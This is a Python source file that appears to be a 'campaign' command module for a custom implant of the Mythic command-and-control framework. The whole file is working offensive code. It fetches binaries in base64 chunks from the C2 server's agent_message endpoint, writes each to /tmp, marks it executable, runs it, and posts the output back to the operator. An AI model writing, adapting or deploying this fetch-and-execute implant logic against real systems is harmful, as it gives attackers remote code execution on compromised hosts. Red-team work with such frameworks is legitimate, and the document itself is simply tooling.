import os
import json
import base64
import subprocess
import uuid

CHUNK_SIZE = 512 * 1024  # 512 KB


# Requests a single chunk of a Mythic-hosted file via the upload wire protocol and returns the response dict
def _fetch_chunk(callback_id, task_id, file_id, chunk_num):
    import agent  # deferred to avoid circular import — agent.py imports this module
    body = {
        "action": "post_response",
        "uuid": callback_id,
        "responses": [{
            "task_id": task_id,
            "upload": {
                "chunk_size": CHUNK_SIZE,
                "file_id":    file_id,
                "chunk_num":  chunk_num,
                "full_path":  "",
            },
        }],
    }
    encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
    r = agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
    resp = json.loads(base64.b64decode(r.content)[36:])
    return resp.get("responses", [{}])[0]


# Posts one script's output back to Mythic. is_last marks the task completed on the final script.
def _post_script_result(callback_id, task_id, output, is_last):
    import agent  # deferred to avoid circular import — agent.py imports this module
    body = {
        "action": "post_response",
        "uuid": callback_id,
        "responses": [{
            "task_id":     task_id,
            "user_output": output,
            "completed":   is_last,
            "status":      "completed" if is_last else "processed",
        }],
    }
    encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
    agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)


# Iterates over a list of Mythic file IDs, fetching and executing each script in order,
# posting incremental results after each one and marking the task complete on the last
def execute(params, task_id, callback_id):
    import agent  # deferred to avoid circular import — agent.py imports this module
    try:
        parsed = json.loads(params)
        file_ids = parsed.get("files", [])
        if isinstance(file_ids, str):
            file_ids = [file_ids]
    except Exception:
        agent.post_response(callback_id, task_id, "campaign: invalid parameters")
        return None

    if not file_ids:
        agent.post_response(callback_id, task_id, "campaign: no files provided")
        return None

    total = len(file_ids)
    for i, file_id in enumerate(file_ids, start=1):
        is_last = (i == total)
        tmp_path = f"/tmp/{uuid.uuid4().hex}"
        try:
            # Fetch compiled binary from Mythic using chunked transfer
            chunk_resp = _fetch_chunk(callback_id, task_id, file_id, 1)
            total_chunks = chunk_resp.get("total_chunks", 1)
            binary_data = base64.b64decode(chunk_resp.get("chunk_data", ""))

            for chunk_num in range(2, total_chunks + 1):
                chunk_resp = _fetch_chunk(callback_id, task_id, file_id, chunk_num)
                binary_data += base64.b64decode(chunk_resp.get("chunk_data", ""))

            # Write binary, make executable, run directly — no python3 needed
            with open(tmp_path, "wb") as fh:
                fh.write(binary_data)
            os.chmod(tmp_path, 0o755)

            result = subprocess.run(
                [tmp_path],
                capture_output=True, text=True, timeout=60
            )
            output = result.stdout + result.stderr
            _post_script_result(
                callback_id, task_id,
                f"[{i}/{total}]:\n{output if output else '(no output)'}",
                is_last
            )

        except subprocess.TimeoutExpired:
            _post_script_result(
                callback_id, task_id,
                f"[{i}/{total}]: script timed out after 60 seconds",
                is_last
            )
        except Exception as e:
            _post_script_result(
                callback_id, task_id,
                f"[{i}/{total}] error: {str(e)}",
                is_last
            )
        finally:
            if os.path.exists(tmp_path):
                os.remove(tmp_path)

    return None  # always — this command manages all its own posts
